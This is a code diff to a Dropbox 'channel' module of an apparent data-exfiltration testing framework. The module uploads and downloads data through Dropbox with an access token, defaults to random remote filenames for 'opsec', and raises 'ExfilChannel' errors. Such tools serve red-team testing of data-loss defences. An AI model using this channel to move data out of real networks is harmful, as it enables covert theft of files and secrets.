@@ -1,6 +1,7 @@
 from sneakers.modules import Channel
+from sneakers.errors import ExfilChannel
+
 import dropbox
-import os
 import string
 import random
 
@@ -9,54 +10,48 @@ class Dropboxc(Channel):
         "name": "Dropbox",
         "author": "davinerd",
         "description": "Send and receive files through Dropbox",
-        "comments": []
+        "comments": ["If you do not specify a remote filename, the module will pick up a random one"]
     }
 
     requiredParams = {
         'sending': {
-            'token': 'Access token.',
-            'rfile': 'Remote file location (overrides opsec_safe).'
+            'token': 'Access token.'
         },
         'receiving': {
             'token': 'Access token.',
-            'rfile': 'File to retrieve (absolute remote path).',
+            'rfile': 'File to retrieve (absolute remote path starting with /).',
         }
     }
 
-    opsec_safe = False
+    optionalParams = {
+        'sending': {
+            'rfile': 'Remote file location.'
+        }
+    }
 
     def send(self, data):
         send_params = self.reqParams['sending']
+        opt_params = self.optParams['sending']
         dbx = dropbox.Dropbox(send_params['token'])
-        is_file = True
-        buf = None
 
-        try:
-            with open(data, 'r') as f:
-                buf = f.read()
-        except Exception:
-            is_file = False
-
-        if 'rfile' in send_params:
-            upload_filename = send_params['rfile']
-            if is_file:
-                data = buf
+        # if we're specifying a remote filename
+        # it means we don't care about opsec
+        if 'rfile' in opt_params:
+            upload_filename = opt_params['rfile']
         else:
             chars = string.ascii_uppercase + string.ascii_lowercase
             upload_filename = ''.join(random.choice(chars) for _ in range(8))
-
-            if is_file:
-                data = buf
-                if not self.opsec_safe:
-                    upload_filename = os.path.basename(data)
 
         # ensure the path is remote absolute
         if not upload_filename.startswith("/"):
             upload_filename = "/"+upload_filename
 
-        dbx.files_upload(data, upload_filename)
+        try:
+            dbx.files_upload(data, upload_filename)
+        except Exception as err:
+            raise ExfilChannel("Upload to Dropbox failed: {0}".format(err))
 
-        return
+        return upload_filename
 
     def receive(self):
         rec_params = self.reqParams['receiving']
@@ -67,5 +62,9 @@ class Dropboxc(Channel):
         if not remote_file.startswith("/"):
             remote_file = "/"+remote_file
 
-        res = dbx.files_download(remote_file)
+        try:
+            res = dbx.files_download(remote_file)
+        except Exception as err:
+            raise ExfilChannel("Download of {0} failed: {1}".format(remote_file, err))
+
         return [res[1].content]
